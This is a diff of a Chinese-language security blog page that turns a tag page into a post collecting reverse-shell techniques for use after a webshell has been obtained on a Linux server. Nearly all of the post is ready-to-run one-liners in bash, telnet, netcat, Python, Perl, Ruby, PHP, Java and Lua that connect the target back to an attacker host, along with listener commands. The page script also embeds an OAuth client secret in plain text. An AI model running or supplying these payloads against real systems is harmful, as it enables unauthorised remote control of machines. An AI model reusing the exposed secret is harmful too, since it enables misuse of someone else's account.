@@ -6,18 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: Ubuntu | Brucetg&#39;s Blog</title>
+  <title>多种姿势反弹shell | Brucetg&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Brucetg 的博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Brucetg&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/tags/Ubuntu/index.html">
+  <meta name="description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。 0x01. Bash反弹  攻击者主机上执行监听： nc -lvvp port   目标主机上执行： bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/port 0&amp;gt;&amp;amp;1   简单解释下：  bash -i">
+<meta name="keywords" content="反弹shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="多种姿势反弹shell">
+<meta property="og:url" content="http://yoursite.com/2018/05/03/多种姿势反弹shell/index.html">
 <meta property="og:site_name" content="Brucetg&#39;s Blog">
-<meta property="og:description" content="Brucetg 的博客">
+<meta property="og:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。 0x01. Bash反弹  攻击者主机上执行监听： nc -lvvp port   目标主机上执行： bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/port 0&amp;gt;&amp;amp;1   简单解释下：  bash -i">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-05-03T13:42:38.571Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Brucetg&#39;s Blog">
-<meta name="twitter:description" content="Brucetg 的博客">
+<meta name="twitter:title" content="多种姿势反弹shell">
+<meta name="twitter:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。 0x01. Bash反弹  攻击者主机上执行监听： nc -lvvp port   目标主机上执行： bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/port 0&amp;gt;&amp;amp;1   简单解释下：  bash -i">
   
   
     <link rel="icon" href="/favicon.png">
@@ -163,60 +165,283 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-多种姿势反弹shell" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/04/30/Ubuntu循环登录问题、桌面菜单和侧边栏不显示问题解决办法/" class="archive-article-date">
-  	<time datetime="2018-04-29T18:04:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-30</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/04/30/Ubuntu循环登录问题、桌面菜单和侧边栏不显示问题解决办法/">Ubuntu循环登录问题、桌面菜单和侧边栏不显示问题解决办法</a>
+    <h1 class="article-title" itemprop="name">
+      多种姿势反弹shell
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2018/05/03/多种姿势反弹shell/" class="archive-article-date">
+  	<time datetime="2018-05-03T07:55:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-05-03</time>
+</a>
+        
+        
+    <span class="archive-article-date">
+      阅读量: <span id="busuanzi_value_page_pv"></span>
+    </span>
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p> <strong>在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。</strong></p>
+<h2 id="0x01-Bash反弹"><a href="#0x01-Bash反弹" class="headerlink" title="0x01. Bash反弹"></a>0x01. Bash反弹</h2><p>  攻击者主机上执行监听：</p>
+<pre><code>nc -lvvp port
+</code></pre><p>  目标主机上执行：</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/x.x.x.x/port 0&gt;&amp;1
+</code></pre><p>  简单解释下：</p>
+<ul>
+<li><strong>bash -i</strong>  &nbsp;&nbsp;打开一个交互的bash</li>
+<li><strong>&gt;&amp;</strong> &nbsp;&nbsp;将标准错误输出重定向到标准输出</li>
+<li><strong>/dev/tcp/x.x.x.x/port</strong> &nbsp;&nbsp;意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口</li>
+<li><strong>0&gt;&amp;1</strong>  &nbsp;&nbsp;标准输入重定向到标准输出，实现你与反弹出来的shell的交互</li>
+</ul>
+<p>  <strong>注：</strong></p>
+<p>  <strong>/dev/tcp/</strong>  是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。</p>
+<p>  linux shell下常用的文件描述符是：</p>
+<ol>
+<li><p>标准输入   (stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt; ； </p>
+</li>
+<li><p>标准输出   (stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt; ； </p>
+</li>
+<li><p>标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;。</p>
+<p>另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。</p>
+<p><strong>其他版本：</strong></p>
+<ol>
+<li><p>exec /bin/bash 0&amp;0 2&gt;&amp;0</p>
+</li>
+<li><p>0&lt;&196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</p>
+</li>
+<li><p>exec 5&lt;&gt;/dev/tcp/attackerip/4444cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done  # or:while read line 0&lt;&5; do $line 2&gt;&amp;5 &gt;&5; done</p>
+</li>
+</ol>
+</li>
+</ol>
+<h2 id="0x02-telnet反弹"><a href="#0x02-telnet反弹" class="headerlink" title="0x02. telnet反弹"></a>0x02. telnet反弹</h2><p>  攻击者主机上打开两个终端分别执行监听：</p>
+<pre><code>nc -lvvp 4444
+
+nc -lvvp 5555
+</code></pre><p>  目标主机中执行：</p>
+<pre><code>telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555
+</code></pre><p>  监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip</p>
+<p>  反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。</p>
+<p>  另一个版本：</p>
+<pre><code>rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 4444 0/tmp/p
+</code></pre><h2 id="0x03-nc（netcat）反弹"><a href="#0x03-nc（netcat）反弹" class="headerlink" title="0x03. nc（netcat）反弹"></a>0x03. nc（netcat）反弹</h2><p>  攻击者主机上执行监听命令：</p>
+<pre><code>nc -lvvp port
+</code></pre><p>  目标主机上执行：</p>
+<pre><code>nc -e /bin/bash x.x.x.x port
+</code></pre><p>  如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p>
+<pre><code>1. rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x 9999 &gt;/tmp/f
+</code></pre><p>  <strong>注：</strong></p>
+<p>  mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信。</p>
+<pre><code>2. nc x.x.x.x 4444|/bin/bash|nc x.x.x.x 5555   #从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。
+
+3. nc -c /bin/sh x.x.x.x 4444
+
+4. /bin/sh | nc x.x.x.x 4444
+</code></pre><h2 id="0x04-常见脚本反弹："><a href="#0x04-常见脚本反弹：" class="headerlink" title="0x04. 常见脚本反弹："></a>0x04. 常见脚本反弹：</h2><p>  <strong>1. Python</strong></p>
+<pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;x.x.x.x&quot;,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos;
+</code></pre><p>  <strong>2. Perl</strong></p>
+<p>  方法一：  </p>
+<pre><code>perl -e &apos;use Socket;$i=&quot;x.x.x.x&quot;;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;
+</code></pre><p>  方法二：</p>
+<pre><code>perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:5555&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;
+</code></pre><p>  <strong>3. Ruby</strong></p>
+<p>  方法一：</p>
+<pre><code>ruby -rsocket -e &apos;exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;5555&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&apos;
+</code></pre><p>  方法二：</p>
+<pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;x.x.x.x&quot;,5555).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;
+</code></pre><p>  <strong>4. PHP</strong></p>
+<pre><code>php -r &apos;$sock=fsockopen(&quot;x.x.x.x&quot;,5555);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;
+</code></pre><p>  <strong>5. Java</strong></p>
+<pre><code>    public class Revs {
+    /**
+    * @param args
+    * @throws Exception 
+    */
+    public static void main(String[] args) throws Exception {
+        // TODO Auto-generated method stub
+        Runtime r = Runtime.getRuntime();
+        String cmd[]= {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;};
+        Process p = r.exec(cmd);
+        p.waitFor();
+    }
+}
+</code></pre><p>  <strong>6. Lua</strong></p>
+<pre><code>lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;x.x.x.x&apos;,&apos;5555&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;
+</code></pre><p>  注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听:</p>
+<pre><code>nc -lvvp 5555
+</code></pre><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05. 总结"></a>0x05. 总结</h2><p>  上面提到的反弹shell的方法只是一些比较常见的，肯定不够全面，在简单的渗透环境中，上面所提到的应该能满足需求，但是如果是在比较复杂的环境中，还是需要进行一些灵活变通以适应复杂环境的渗透测试，欢迎补充。</p>
+<p>  参考链接：</p>
+<ol>
+<li><a href="https://www.bertramc.cn/2017/07/14/38.html" target="_blank" rel="noopener">https://www.bertramc.cn/2017/07/14/38.html</a></li>
+<li><a href="http://www.myh0st.cn/index.php/archives/237/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/237/</a></li>
+<li><a href="https://www.anquanke.com/post/id/85712" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85712</a></li>
+</ol>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Ubuntu</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">反弹shell</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/05/03/多种姿势反弹shell/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2018/04/30/kali-linux-2-0下搭建DVWA渗透测试演练平台/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">kali linux 2.0下搭建DVWA渗透测试演练平台</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
+  <div id="gitment-ctn"></div> 
+<link rel="stylesheet" href="//imsun.github.io/gitment/style/default.css">
+<script src="//imsun.github.io/gitment/dist/gitment.browser.js"></script>
+<script>
+var gitment = new Gitment({
+  id: window.location.pathname,
+  id: "多种姿势反弹shell",
+  owner: 'Brucetg',
+  repo: 'gitment-comments',
+  oauth: {
+    client_id: '993656f0463814b2f825',
+    client_secret: '7ca1b39a9fa334778cc530b82981c960f8a12ce8',
+  },
+})
+gitment.render('gitment-ctn')
+</script>
+  
 
 
           </div>
@@ -244,9 +469,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
